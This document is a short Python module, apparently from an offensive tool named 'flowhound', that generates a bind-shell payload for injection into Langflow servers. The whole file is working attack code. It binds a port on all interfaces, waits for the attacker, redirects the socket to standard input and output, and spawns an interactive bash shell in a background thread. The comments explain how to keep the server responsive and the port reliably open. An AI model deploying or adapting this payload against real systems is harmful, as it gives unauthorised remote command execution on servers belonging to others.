from flowhound.vulnerabilities.payloads.base_payload_class import PayloadBaseClass


class Payload(PayloadBaseClass):
    blocking = True  # accept() blocks until the attacker connects

    def __init__(self, rhost: str, rport: int = 4444):
        # rhost is the victim's IP — used by the attacker to probe/connect.
        # The victim-side payload always binds on 0.0.0.0 so it listens on
        # all interfaces regardless of which IP the attacker uses to reach it.
        self.rhost = rhost
        self.rport = rport
        self.payload = self.generate_payload(rport=rport)

    def generate_payload(self, rport: int) -> str:
        # The blocking accept() runs in a daemon thread so Langflow's worker
        # is freed immediately and the server does not hang.  The thread binds
        # on 0.0.0.0 so it is reachable on any interface.  SO_REUSEADDR lets
        # the port be re-bound immediately if the process restarts.  Once the
        # attacker connects, the fd is dup'd onto stdin/stdout/stderr, bash is
        # spawned in a new session, then both sockets are closed.  The main
        # thread sleeps briefly so the daemon thread has time to bind and start
        # listening before the Langflow response is sent — giving the attacker
        # a reliably open port to probe.
        return (
            "import os, socket, subprocess, threading, time\n"
            "def _bind_shell():\n"
            "    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "    _s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            f"    _s.bind(('0.0.0.0', {rport}))\n"
            "    _s.listen(1)\n"
            "    _c, _a = _s.accept()\n"
            "    _fd = _c.fileno()\n"
            "    os.dup2(_fd, 0); os.dup2(_fd, 1); os.dup2(_fd, 2)\n"
            "    subprocess.Popen(\n"
            "        ['/bin/bash', '-i'],\n"
            "        stdin=0, stdout=1, stderr=2,\n"
            "        close_fds=False,\n"
            "        start_new_session=True,\n"
            "    )\n"
            "    _c.close()\n"
            "    _s.close()\n"
            "_t = threading.Thread(target=_bind_shell, daemon=True)\n"
            "_t.start()\n"
            "time.sleep(2)\n"
        )

    def load_payload(self) -> str:
        return self.payload
